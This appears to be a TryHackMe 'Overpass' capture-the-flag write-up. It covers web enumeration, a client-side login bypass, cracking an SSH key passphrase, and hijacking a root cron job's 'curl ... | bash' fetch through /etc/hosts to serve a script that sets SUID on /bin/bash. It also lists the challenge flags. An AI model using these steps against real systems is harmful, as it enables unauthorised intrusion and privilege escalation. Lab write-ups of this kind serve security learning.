# Overpass Write-up

## 1. Reconnaissance

I started by scanning the target with Nmap to identify open ports and available services.

```bash
nmap -sC -sV 10.129.128.198
```

The scan showed that **port 80 (HTTP)** was open, so I started investigating the web application.

## 2. Web Enumeration

I inspected the source code of the homepage and found this comment:

```html
<!--Yeah right, just because the Romans used it doesn't make it military grade, change this?-->
```

The reference to the Romans suggested that the application might be using a **Caesar cipher** or another simple substitution cipher.

There was also a `/downloads/` directory. After downloading and inspecting the source code available there, I found that the application uses **ROT47** to obfuscate passwords.

The source code also showed that the password manager stores its encrypted credentials locally in:

```text
~/.overpass
```

ROT47 is reversible and should not be considered secure encryption.

## 3. Discovering the Admin Panel

Next, I performed directory enumeration with FFUF:

```bash
ffuf -w /usr/share/seclists/Discovery/Web-Content/common.txt \
-u http://10.129.128.198/FUZZ
```

This revealed an `/admin/` directory.

Opening the admin panel showed a login page. I then inspected its JavaScript and found `login.js`.

The important part of the login function was:

```javascript
async function login() {
    const usernameBox = document.querySelector("#username");
    const passwordBox = document.querySelector("#password");
    const loginStatus = document.querySelector("#loginStatus");
    loginStatus.textContent = ""

    const creds = {
        username: usernameBox.value,
        password: passwordBox.value
    }

    const response = await postData("/api/login", creds)
    const statusOrCookie = await response.text()

    if (statusOrCookie === "Incorrect credentials") {
        loginStatus.textContent = "Incorrect Credentials"
        passwordBox.value = ""
    } else {
        Cookies.set("SessionToken", statusOrCookie)
        window.location = "/admin"
    }
}
```

The browser checks the server's response and treats anything other than `"Incorrect credentials"` as a valid session token.

## 4. Bypassing the Client-Side Login Check

I modified the JavaScript locally using Chrome DevTools Local Overrides.

I changed:

```javascript
if (statusOrCookie === "Incorrect credentials") {
```

to:

```javascript
if (statusOrCookie !== "Incorrect credentials") {
```

This reversed the client-side logic:

```javascript
if (statusOrCookie !== "Incorrect credentials") {
    loginStatus.textContent = "Incorrect Credentials"
    passwordBox.value = ""
} else {
    Cookies.set("SessionToken", statusOrCookie)
    window.location = "/admin"
}
```

After applying the modified JavaScript, I was able to reach the admin page.

> [!NOTE]
> > The client-side code treats any value other than `"Incorrect credentials"` as a valid `SessionToken`, allowing us to bypass the client-side login check.

## 5. Obtaining James's SSH Key

Inside the admin panel, I found a message containing **James's SSH private key**.

I copied the private key to my machine and saved it as:

```text
ssh-key
```

I then restricted its permissions:

```bash
chmod 600 ssh-key
```

Since the key was protected by a passphrase, I converted it into a John the Ripper-compatible hash:

```bash
ssh2john ssh-key > hash.txt
```

I then attempted to crack the passphrase using `rockyou.txt`:

```bash
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
```

John recovered the passphrase:

```text
james13
```

I could then use the SSH key and recovered passphrase to connect as James.

## 6. User Flag

After logging in as James, I retrieved the user flag:

```text
thm{65c1aaf000506e56996822c6281e6bf7}
```

## 7. Privilege Escalation using Cron Job

I checked the system's cron jobs:

```bash
cat /etc/crontab
```

I found the following entry:

```text
* * * * * root curl overpass.thm/downloads/src/buildscript.sh | bash
```

This means that **every minute**, the root user downloads `buildscript.sh` from:

```text
http://overpass.thm/downloads/src/buildscript.sh
```

and pipes its contents directly into `bash`.

The important part here is that the script is executed by **root**.

I initially considered modifying the original script, but the web files were located in another user's home directory and I did not have permission to modify them.

So I looked at how the script was being retrieved.

## 8. Exploiting Hostname Resolution

I checked `/etc/hosts`:

```bash
cat /etc/hosts
```

and found:

```text
127.0.0.1 overpass.thm
```

Therefore, the cron job was resolving `overpass.thm` to the local machine.

I changed the entry so that `overpass.thm` resolved to my attacking machine:

```text
192.168.137.126 overpass.thm
```

I then created my own malicious `buildscript.sh` on my machine:

```bash
mkdir -p ~/tryhackme/overpass/downloads/src
cd ~/tryhackme/overpass/downloads/src
```

The script contained:

```bash
chmod +s /bin/bash
```

The `+s` sets the **SUID bit** on Bash.

My directory looked like this:

```text
~/tryhackme/overpass/downloads/src/
└── buildscript.sh
```

I then started a Python HTTP server from the appropriate directory:

```bash
cd ~/tryhackme/overpass
python -m http.server 80
```

Output:

```text
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
```

## 9. Getting Root

The cron job runs every minute, so eventually the root cron process requested:

```text
http://overpass.thm/downloads/src/buildscript.sh
```

Because I had redirected `overpass.thm` to my machine, the request reached my Python HTTP server.

The root cron job downloaded my `buildscript.sh` and executed it as root.

The script therefore executed:

```bash
chmod +s /bin/bash
```

as root.

I confirmed that Bash now had the SUID bit:

```bash
ls -al /bin/bash
```

which showed:

```text
-rwsr-sr-x 1 root root 1183448 Apr 18 2022 /bin/bash
```

The `s` in:

```text
-rwsr-sr-x
```

indicates that the SUID bit is set.

Finally, I executed:

```bash
bash -p
```

The `-p` option preserves the effective privileges, giving me a root shell.

I could then retrieve the root flag.

## 10. Root Flag

```text
thm{7f336f8c359dbac18d54fdd64ea753bb}
```

# Attack Chain

The complete attack chain was:

```text
Nmap
  ↓
Port 80
  ↓
Web enumeration
  ↓
/downloads/
  ↓
Discover ROT47 + ~/.overpass
  ↓
FFUF
  ↓
/admin/
  ↓
Client-side JavaScript login check
  ↓
Modify login.js with Local Overrides
  ↓
Admin panel
  ↓
James's SSH private key
  ↓
ssh2john + John the Ripper
  ↓
SSH as James
  ↓
User flag
  ↓
/etc/crontab
  ↓
Root downloads buildscript.sh every minute
  ↓
overpass.thm resolves through /etc/hosts
  ↓
Redirect overpass.thm to attacker machine
  ↓
Serve malicious buildscript.sh
  ↓
Root executes it
  ↓
SUID /bin/bash
  ↓
bash -p
  ↓
Root flag
```

# Key Lessons

- **Source-code comments can provide useful clues** during web enumeration.
    
- **ROT47 is obfuscation, not secure password encryption.**
    
- Client-side authentication logic should never be trusted as the actual security boundary.
    
- SSH private keys may still be protected by a passphrase, requiring additional cracking.
    
- Always inspect `/etc/crontab` and other scheduled tasks during privilege escalation.
    
- A root cron job that downloads and executes a remote/local script is extremely dangerous if the source of that script can be influenced.
    
- The SUID bit can cause an executable to run with the privileges of its owner.